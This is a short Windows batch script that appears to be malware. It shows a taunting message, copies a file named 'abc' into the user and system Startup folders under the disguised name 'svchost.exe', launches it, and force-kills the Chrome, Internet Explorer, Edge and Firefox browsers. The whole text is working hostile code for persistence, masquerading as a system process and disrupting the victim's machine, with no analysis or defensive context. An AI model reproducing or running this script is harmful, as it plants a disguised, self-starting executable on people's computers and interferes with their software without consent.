msg * The end of saiya people

echo f|xcopy /f ".\abc" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc" "svchost.exe"
start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
echo f|xcopy ".\abc" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc" "svchost.exe"


TASKKILL /im chrome.exe /f
TAskkill /im iexplorer.exe /f
TAskkill /im microsoftedge.exe /f
TAskkill /im firefox.exe /f
